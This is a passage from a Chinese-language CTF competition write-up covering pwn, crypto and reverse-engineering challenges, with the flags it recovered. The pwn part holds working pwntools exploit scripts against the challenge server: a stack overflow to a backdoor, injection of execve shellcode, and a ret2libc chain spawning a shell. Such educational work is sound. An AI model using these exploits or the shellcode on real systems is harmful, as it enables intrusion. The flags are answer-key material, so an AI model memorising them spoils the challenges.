conn = remote('direct.szu.moe', 10052)
conn.recvuntil(b'U have 5 minutes to solve these challenges.')

for _ in range(100):
    data = conn.recvuntil(b' = ?\n').decode()
    answer = eval(str(data)[:-4])
    conn.sendline(str(answer).encode())
    
print(conn.recvall().decode())
```





![image-20250302215919813](../_media/image-20250302215919813.png)

### [Medium] 幽幽子的食物

一道经典的栈溢出

![image-20250302194603767](../_media/image-20250302194603767.png)





有后门的gift

```
void __cdecl g1ft()
{
  puts("W0w, you have found Yuyuko's food!");
  system("/bin/sh");
}
```

因为是64位，有堆栈平衡，所以直接返回到/bin/sh的汇编处即可

也就是

```
lea     rax, command    ; "/bin/sh"
addr = 0x4011AC
```

可控制的输入流是`s`

```
溢出到return函数

0x30 + 0x08
```



```python
# # *- coding: utf-8 -*-
from pwn import * 
context(arch='amd64',os='linux',log_level='debug')
ip = "direct.szu.moe"
port = 10073
p = remote(ip,port)  
payload = b'a' * (0x30 + 0x08) + p64(0x4011AC)
p.recvuntil(b'Can you find it?')
p.sendline(payload) 
p.interactive()
```

![image-20250302195307488](../_media/image-20250302195307488.png)

最终的flag：

```
Aurora{ad58bcd5-58f3-4c14-bff9-e92537a1273e}
```



### [Middle-Hard] 幽幽子的食物2

```bash
helloctfos@Hello-CTF:~/pwnenv$ checksec pwn
[*] '/home/helloctfos/pwnenv/pwn'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```



看了下题目，给了buf的地址，没有system函数，也没有后门函数，应该就是多次利用puts函数进行构造

感觉是sys2call

第一次收到buf的地址，然后写入shellcode；第二次直接溢出到那里去直接执行

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

ip = "direct.szu.moe"
port = 10094

p = remote(ip, port)  
# p = process("./pwn") 

offset = 0x30  

p.recvuntil("Here is your gift: ")
buf_addr_str = p.recvline().strip().decode()  
buf_addr = int(buf_addr_str, 16)  

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
p.sendline(shellcode)

p.recvuntil(b"Bye~")
payload = flat(
    b'A' * offset,
    p64(0),  
    p64(buf_addr)  
)
p.sendline(payload)

p.interactive()
```



```
Aurora{f4e4a32d-13f4-44c7-a12f-02d0ccab59ce}
```



### [Middle-Hard] StarRail

```bash
helloctfos@Hello-CTF:~/pwnenv$ checksec pwn
[*] '/home/helloctfos/pwnenv/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```





ida里面一通看

```
src 最终是赋值给 secret，最后要实现 system(secret);
```



感觉像是金丝雀的漏洞，前面的buf用来读取v7的值，然后v6写入的时候将这个值填回去，顺带溢出到gift地址

```
system_addr = 0x401211
```



```
buf = b'/bin/sh\x00'
```



```python

```



### [Hard] TiamaT:F Minor

老规矩`checksec`一下

```
helloctfos@Hello-CTF:~/pwnenv$ checksec pwn
[*] '/home/helloctfos/pwnenv/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



而且给个libc.so.6，怀疑就是ret2libc

main函数里面一个充足长度的read，所以可操控的输入流就是buf

长度：

```
offset = b'a'* (0x30 + 0x08)
```



利用puts函数：它的plt位置在这里：

```
.plt:0000000000400520
```

就是打印出put的got地址，然后libc找偏移量



查找一下ret和rdi的寄存器位置：

```bash
helloctfos@Hello-CTF:~/pwnenv$ ROPgadget --binary ./pwn --only "pop|ret" | grep "rdi"
0x0000000000400743 : pop rdi ; ret
helloctfos@Hello-CTF:~/pwnenv$ ROPgadget --binary ./pwn --only "ret"
Gadgets information
============================================================
0x0000000000400506 : ret
0x00000000004008b8 : ret 0xfffd

Unique gadgets found: 2
```

故寄存器地址如下：

```
rdix_addr = 0x400743
retx_addr = 0x400506
```



总脚本：

```python
# -*- coding: utf-8 -*-
from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux',log_level='debug')
ip = "direct.szu.moe"
port = 10031

p = remote(ip,port)
elf = ELF('./pwn')
libc = ELF('libc.so.6')

rdix_addr = 0x400743
retx_addr = 0x400506


offset = b'a'* (0x30 + 0x08)
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

payload = offset
payload += p64(rdix_addr) + p64(puts_got)
payload += p64(puts_plt) 
payload += p64(main_addr)

p.recvuntil(b'Show me your power!')
p.sendline(payload)

p.recvuntil(b'\n')

puts_addr = u64(p.recv(6).ljust(8,b'\x00'))

libc_base = puts_addr - libc.sym['puts']

system_addr = libc_base + libc.sym['system']

binsh_addr = libc_base + libc.search('/bin/sh').__next__()

payload_exp = offset

payload_exp += p64(rdix_addr) + p64(binsh_addr)

payload_exp += p64(retx_addr) + p64(system_addr)

p.sendline(payload_exp)

p.interactive()
```



![image-20250302202426829](../_media/image-20250302202426829.png)

flag：

```
Aurora{549ca27d-b99c-4d9c-9222-c5f83412beb7}
```



## Crypto

### [Easy]SIGN IN!!!

下载之后发现

```
Nheben{Jrypbzr_gb_gur_Jbeyq_bs_Pelcgbtencul}
```

规整，怀疑是什么栅栏或者Rot

随波逐流一下，结果Rot13解码：

得到flag：

```
Aurora{Welcome_to_the_World_of_Cryptography}
```



### [Easy]yafu一下

运行一下yafu.exe

```
2345775239986667790244313719311162569576964909201570612844805257491586533117160117708979989944682143641737
2345775239986667790244313719311162569576964909201570612844805257491586533117160117708979989944682143638653
```

再将long转为bytes

```python
n=2345775239986667790244313719311162569576964909201570612844805257491586533117160117708979989944682143638653

byte_length = (n.bit_length() + 7) // 8

bytes_data = n.to_bytes(byte_length, byteorder='big')

print(bytes_data)
```

解码出flag：

```
Aurora{ab544f67-c91d-4f2e-9306-aec2a15bc1ad}
```



### [Medium]不止ECB

观察最核心的东西：

```python
for i in range(len(flag)//16):
    enc_block = encryptor.encrypt(xor(flag[i*16:i*16+16],iv))
    enc = enc + enc_block
    iv = enc_block
```

enc、iv是已知的

```python
encryptor = AES.new(key,AES.MODE_ECB)
```

综上key=16_letter_phrase

所以要将密文分为16字节的块，然后使用加密时的初始iv，使用给定的aes-ecb模式解密每个块，然后将这个结果与前一个iv进行xor操作，得到明文

原flag被重复两次，所以解密一半即可得到flag。

```python
from Crypto.Cipher import AES
from Crypto.Util.number import bytes_to_long, long_to_bytes

def xor(a: bytes, b: bytes):
    assert len(a) == len(b)
    return long_to_bytes(bytes_to_long(a) ^ bytes_to_long(b))

key = b'16_letter_phrase'
iv = b'WherewillIbeused'
enc = b'74\xf1f\xd5\x80\xff\r\xe9\x00 \x7fX\x170Y\x14v\xc1\xc8\xaf0\x1eW\xd6\x9d\xc2W\x11N%\x13\xd1B\xc5\xfaA=\xa4\xd6\ne\x8b\xf1&\xac\x9dE'

cipher = AES.new(key, AES.MODE_ECB)
blocks = [enc[i*16:(i+1)*16] for i in range(len(enc)//16)]

prev_iv = iv
plaintext = b''

for block in blocks:
    decrypted = cipher.decrypt(block)
    plain_block = xor(decrypted, prev_iv)
    plaintext += plain_block
    prev_iv = block  # 更新为当前密文块

flag = plaintext[:len(plaintext)//2]
print(flag.decode())
```



解密的flag：

```
Aurora{__N0t_0n1y_ECB__}
```



### [Medium-Hard]现代密码学第一课：初等数论

用于判断是否是素数，是的话就返回n-1，不是就返回0，特例就是n==4的时候返回2

```python
def calculator(n):
    mul = 1
    for i in range(1,n):
        mul *= i
    return mul % n
```



n==0，return 0

n==1，return 2

n>=2，等价于欧拉函数，n为素数，return n-1；n为合数，return 欧拉函数

```python
def an_easy_function(n):
    cnt = 0
    for i in range(n + 1):
        if gcd(n , i) == 1:
            cnt += 1
    return cnt
```



```
invert函数经典求逆元
```



综合：

```python
from Crypto.Util.number import long_to_bytes
import gmpy2

def is_prime(n):
    return gmpy2.is_prime(n)

randomlist = [
    338501482672597924012348469679792012769, 241268114261307332325950648053768201847,
    232738134149761223238511724275013832113, 226416018974707885269433162213263846487,
    271560089953067180517952683487780077019, 316755991591692615720440097320340825689,
    174243453462328077484562768274176346629, 228364185300839775137963993979681519349,
    180621301558144892387025235565130871968, 206831731780515972990273085633612765244,
    265493953542837018302980844276705698281, 308237875911633465466084529057693690714,
    183226840900575627862404097460278966890, 213555295044282248934504655790867698229,
    213480228384921867121519098089485862529, 331141475008748492052446367352164459859
]

primes = [x for x in randomlist if is_prime(x)]
value1 = 1
for p in primes:
    value1 *= p

phi = 1
for p in primes:
    phi *= (p - 1)

e = 65537
d = gmpy2.invert(e, phi)

secret_value = 933645457070838457387264561811996843727997791294796437600208891096658274756589525864413515063897282102917428233893395715228433038250678318743375886646684621347690406535795444276597133347469414665859122146807150090599614710034778299995512643468687210913208747676612003300463698891719449438395335125621214539439606067941295036087380800149903160413
plaintext = pow(secret_value, d, value1)

flag = long_to_bytes(plaintext).decode()
print(f"Flag: {flag}")
```



flag：

```
Flag: Aurora{El3m3nt4ry_numb3r_th3ory_1s_fun}
```



### [Medium-Hard]ezSSP



```python
from Crypto.Util.number import *
from random import randint
from flag import flag

m = bytes_to_long(flag)
n = m.bit_length()

f = open('out.txt', 'w')

sequence = [3]

for i in range(1, n):
    sequence.append(sum(sequence) + randint(1, 10))
f.write(f'{sequence = }\n')

c = 0
M = bin(m)[2:]

for i in range(n):
    if M[i] == '1':
        c += sequence[i]

f.write(f'{c = }')

```



反写：

```python
from Crypto.Util.number import long_to_bytes

# 读取文件中的sequence和c的数据
with open('C:/Users/HelloCTF_OS/Desktop/zanshi/output.txt', 'r') as f:
    lines = f.readlines()
    sequence = eval(lines[0].split('=')[1].strip())
    c = eval(lines[1].split('=')[1].strip())

bits = []

# 逆序遍历sequence
for s in reversed(sequence):
    if c >= s:
        bits.append('1')
        c -= s
    else:
        bits.append('0')
        
# 反转得到正确的二进制顺序
bits = bits[::-1]
binary_str = ''.join(bits)

# 转换为整数并恢复flag
m = int(binary_str, 2)
flag = long_to_bytes(m).decode('utf-8', 'ignore') 

print(flag)
```



flag：

```
Aurora{Do_n0t_u5e_suUuuUUUup3r-incr3as1ng_Sequence!!!}
```



### [Medium]revRSA

经典构造

因为源程序e是随机取值，所以破解程序要在给定范围里试出来，所以这边需要暴力

重点在于：`key = inverse(e,phi)`和`c = pow(m,key,n)`

`m = c^e mod n`

然后生成明文`pow(c,e,n)`

然后通过判断字符串的首部来看是否为一个正确的flag



```python
from Crypto.Util.number import *

c = 10931782712834198694232922136159100286842921095597808418124343637744659232150289560342028755488604484696198617455639382408274345588067440770294792636820403743221380554827730947807760677734618879229745397271302639303496735320295117612951614230198439298137362431804637647838124015071897304256844303977032111516035624252544816756534886525708254893949064578134381640587797402800730980145493114277089996839192867219953670808599132307953311110661231443970810878427261017921186437020732105853206493162836221065778570334004658113191217365625768218538105570393381858198335833732944601627794075943610444257381480678160625831826
n = 17871614032798312106865158975019723885622047915388346141503110313896073919276744494141739555299279574708592177092439207828106619403829128787152639216302473972431066100540769481962458276541948162771018887930817073980743820329112989634927182013215177564516409160278159186224688035732029483715858720459982789594152331062069943189402326021638673996819981945623506707420359433537936068137465792942964496815661737730720410743756796355374666902185194962898658607432786036990855950491979720234109990890343866647616529004147558368014921924832122729781602764425182940454742543623341899366140391819219500598836337380079704372623


for e_candidate in range(10000, 100000):
    m_candidate = pow(c, e_candidate, n)
    bytes_flag = long_to_bytes(m_candidate)
    if bytes_flag.startswith(b'Aurora{'):
        print(e_candidate)
        print(bytes_flag.decode())
        break
```



flag：

```
Aurora{Do_u_Kn0w_7he_pr1ncipl3_0F_RSA?}
```



### [Medium-Hard]Sage入门



sage求解：

```python
p = 106848578715837753291575932444740811601404725707890986739500249258632733131213
c = [13640204933658176989, 15992342644431284393, 17477815402493531809, 9818531077534590767, 15069677534786720639, 13444572465633670519]
enc = 12001337155142241289192975048861943945978889061994755003008455134297465877520

R.<x> = PolynomialRing(GF(p), 'x')
f = c[0] + c[1]*x + c[2]*x^2 + c[3]*x^3 + c[4]*x^4 + c[5]*x^5 - enc
roots = f.roots()

for root, _ in roots:
    part2 = bytes.fromhex(hex(int(root))[2:])
    print("Part 2:", part2)
```



ans:

```
Part 2: b'_\xf6\xadu\xc2\xbd\x95\x83\xabndH5n|\xdc\x08v\x12\x07\x848_\x1e\xf9c\xe3\x85B\x915P'
Part 2: b'+d\xf9X"\x9e,2\xac]v\xdb\xbf\xf8q_9N\xe1\xeaC\x0e\xf3j:\x0fg}\x1ft~\xcd'
Part 2: b'y_kn0w_H0w_7o_u5e_S4ge_}'
```



python:

```python
from sympy.ntheory.modular import crt
from Crypto.Util.number import long_to_bytes

plist = [2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101,103,107,109,113,127,131,137,139,149,151]
mlist = [0,0,2,4,3,6,8,1,3,17,19,0,5,22,43,12,17,16,42,44,60,58,28,23,36,51,93,33,63,9,63,127,64,104,138,5]

m_part1, mod = crt(plist, mlist)
part1 = long_to_bytes(m_part1)

part2 = b'y_kn0w_H0w_7o_u5e_S4ge_}'
flag = part1 + part2
print(flag)
```



flag:

```
Aurora{_I_th1nk_U_alre4dy_kn0w_H0w_7o_u5e_S4ge_}
```



## Reverse

### [Easy] First lesson

查基本信息

![image-20250228192443251](../_media/image-20250228192443251.png)



`View Strings`

![image-20250228192556589](../_media/image-20250228192556589.png)

以及前面的`first_part`

![image-20250228192633295](../_media/image-20250228192633295.png)

最终的flag：

```
Aurora{U_know_f5_and_string_list!}
```





### [Easy] YaGodaHave_Unix_VM

ELF文件，直接放在虚拟机里

```
chmod 751 How_to_run_the_ELF_file
./How_to_run_the_ELF_file
```



得到flag：

```
Aurora{U_H4ve_4_Un1x_Syst0m_2_Pl4y_CTF!}
```



### [Middle-hard] ezASM

给出来一个汇编代码，想来是锻炼哥们汇编能力

```
mov     [rbp+var_4], 1Bh
var_4 = 0x1B = 27
```

每个字符减1，然后与0x12进行异或，得出来enc

所以

```
enc= "Rfc|crhGG=dLFLcLr&~L~!`a cn"

flag[i] = enc[i]^0x12 + 1
```

直接写python

```python
encs = "Rfc|crhGG=dLFLcLr&~L~!`a cn"
flag = ""
for enc in encs:
    cc = (ord(enc) ^ 0x12) + 1
    flag += chr(cc)
print(flag)
```

or

```python
enc = "Rfc|crhGG=dLFLcLr&~L~!`a cn"
result = ''.join( [ chr( (ord(c) ^ 0x12) + 1 ) for c in enc ] )
print(result)
```



flag:

```
Aurora{VV0w_U_r_a5m_m4st3r}
```



### [Easy] Debug me level1







### [Medium] 鸣潮, 动启!

`uncompyle6` 现仅适用于 Python 2.4 到 3.8 版本：

```
https://github.com/extremecoders-re/pyinstxtractor/blob/master/pyinstxtractor.py
```



```
pip install uncompyle6
```



```
python pyinstxtractor.py WutheringWaves.exe
```

![image-20250303105012682](../_media/image-20250303105012682.png)





```
uncompyle6 chall.pyc > WutheringWaves.py
```

或者直接在线网站

解出来的结果，太长了就不放了，然后稍微读一下和替换那个长长的`ooO00O000Ooo00oOOO00o00Oo0O00oOo0Ooo000ooOOoo00oOO0`



```python
key1 = [
    45, 87, 186, 22, 188, 153, 97, 140, 198, 147, 91, 255, 200, 117, 120, 234, 104, 237, 240, 151, 207, 184, 114, 244, 75, 224, 127, 92, 56, 103, 212, 187, 236
]
key2 = [
    108, 34, 200, 121, 206, 248, 26, 195, 139, 212, 4, 182, 188, 42, 11, 181, 56, 148, 132, 255, 160, 214, 45, 166, 46, 150, 26, 46, 75, 14, 186, 220, 145
]

password_bytes = [k1 ^ k2 for k1, k2 in zip(key1, key2)]
password = ''.join(chr(b) for b in password_bytes)
print("Password:", password)
```



得到flag：

```
Aurora{OMG_It_s_Python_Reversing}
```





### [Middle-hard] want to paly ZZZ?

沃超，绝区零

放进jadx里面进行狠狠地视察



发现一些可疑函数

```java
    public String toString(){
       StringBuilder str = "ContentInfoCompat{clip="+this.mClip.getDescription()+", source="+ContentInfoCompat.sourceToString(this.mSource)+", flags="+ContentInfoCompat.flagsToString(this.mFlags);
       String str1 = "";
       String str2 = (this.mLinkUri == null)? str1: ", hasLinkUri\("+this.mLinkUri.toString().length()+"\)";
       str = str+str2;
       if (this.mExtras != null) {
          str1 = ", hasExtras";
       }
       return str+str1+"}";
    }
```



```java
static String flagsToString(int flags){
       if ((flags & 0x01)) {
          return "FLAG_CONVERT_TO_PLAIN_TEXT";
       }
       return String.valueOf(flags);
    }

```



```java
static String sourceToString(int source){
       switch (source){
           case 0:
             return "SOURCE_APP";
           case 1:
             return "SOURCE_CLIPBOARD";
           case 2:
             return "SOURCE_INPUT_METHOD";
           case 3:
             return "SOURCE_DRAG_AND_DROP";
           case 4:
             return "SOURCE_AUTOFILL";
           case 5:
             return "SOURCE_PROCESS_TEXT";
           default:
             return String.valueOf(source);
       }
    }
```

